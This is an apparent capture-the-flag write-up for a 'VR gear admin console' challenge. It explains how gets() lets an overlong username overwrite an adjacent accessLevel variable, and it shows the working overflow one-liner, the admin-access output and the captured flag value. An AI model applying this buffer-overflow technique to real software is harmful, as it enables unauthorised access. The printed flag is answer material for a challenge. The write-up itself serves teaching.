@@ -1,0 +1,48 @@
+The authentication for the program seems to be fairly simple.
+There is an access variable that represents our level of authentication,
+and if it is less than 0x30 (48 in decimal), but greater than 0, we
+get a shell. In the login() function, it looks like we can log in as admin or root,
+but their passwords are one character too long.
+
+We also notice that there are two calls to gets() in login(), for the username and password.
+gets() permits buffer overflowing, so we can make use of that to overflow the accessLevel
+variable to whatever we want.
+
+    int accessLevel = 0xff;
+    char username[16];
+    char password[32];
+
+Because of this, if we overflow the username buffer with something larger than 16 characters, we can
+write anything we want to accessLevel. Knowing this, we can perform our attack.
+
+james9909@shell-web:/problems/983b223e2939da4db7ab39b5bec62798$ cat <(python -c "print 'A'*16 + '\x01'") - | ./vrgearconsole
++----------------------------------------+
+|                                        |
+|                                        |
+|                                        |
+|                                        |
+|  Welcome to the VR gear admin console  |
+|                                        |
+|                                        |
+|                                        |
+|                                        |
++----------------------------------------+
+|                                        |
+|      Your account is not recognized    |
+|                                        |
++----------------------------------------+
+
+
+
+
+Please login to continue...
+
+
+Username (max 15 characters): Password (max 31 characters): password
+Your access level is: 0x00000001
+Admin access granted!
+The flag is in "flag.txt".
+ls
+flag.txt  vrgearconsole  vrgearconsole.c
+cat flag.txt
+594586852f3bf590e5946dbeab1b5bfa
